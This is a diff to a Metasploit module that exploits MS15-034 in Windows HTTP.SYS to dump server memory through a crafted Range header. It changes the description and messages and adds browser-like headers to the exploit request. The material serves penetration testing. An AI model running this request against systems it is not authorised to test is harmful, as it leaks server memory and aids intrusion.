@@ -15,14 +15,12 @@ class Metasploit3 < Msf::Auxiliary
     super(
       'Name'        => 'MS15-034 HTTP.SYS Memory Dump',
       'Description' => %q{
-        Dumps memory contents using a crafted Range header.
-        Reportedly affects Win7 and up, tested against Win8.1 and
-        Server 2012R2 with no crashes.  Note that if the target is
-        running in VMware Workstation, this module has a high likelihood
-        of resulting in BSOD. However, VMware ESX and non-virtualized
-        hosts seem stable.  Using a larger target file should result
-        in more memory being dumped, and SSL seems to produce more data
-        as well.
+        Dumps memory contents using a crafted Range header. Affects only
+        Windows 8.1, Server 2012, and Server 2012R2. Note that if the target
+        is running in VMware Workstation, this module has a high likelihood
+        of resulting in BSOD; however, VMware ESX and non-virtualized hosts
+        seem stable. Using a larger target file should result in more memory
+        being dumped, and SSL seems to produce more data as well.
       },
       'Author'      => 'Rich Whitcroft <rwhitcroft[at]gmail.com>',
       'License'     => MSF_LICENSE,
@@ -107,7 +105,7 @@ class Metasploit3 < Msf::Auxiliary
         print_error("Target is not vulnerable")
         return
       else
-        print_good("Target is vulnerable!")
+        print_good("Target may be vulnerable...")
       end
 
       # determine the size of the resource
@@ -144,7 +142,7 @@ class Metasploit3 < Msf::Auxiliary
 
       sock = Rex::Socket::Tcp.create(sock_opts)
 
-      req = "GET #{datastore['TARGET_URI']} HTTP/1.1\r\nHost: #{ip}\r\nRange: #{ranges}\r\n\r\n"
+      req = "GET #{datastore['TARGET_URI']} HTTP/1.1\r\nHost: #{ip}\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\r\nAccept: */*\r\nConnection: keep-alive\r\nRange: #{ranges}\r\n\r\n"
       sock.put(req)
 
       print_good("Stand by...")
@@ -170,7 +168,7 @@ class Metasploit3 < Msf::Auxiliary
         loot_path = store_loot('iis.ms15034', 'application/octet-stream', ip, resp, nil, 'MS15-034 HTTP.SYS Memory Dump')
         print_status("Memory dump saved to #{loot_path}")
       else
-        print_error("Error receiving from socket or no data received")
+        print_error("Target does not appear to be vulnerable (must be 8.1, 2012, or 2012R2)")
         return
       end
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
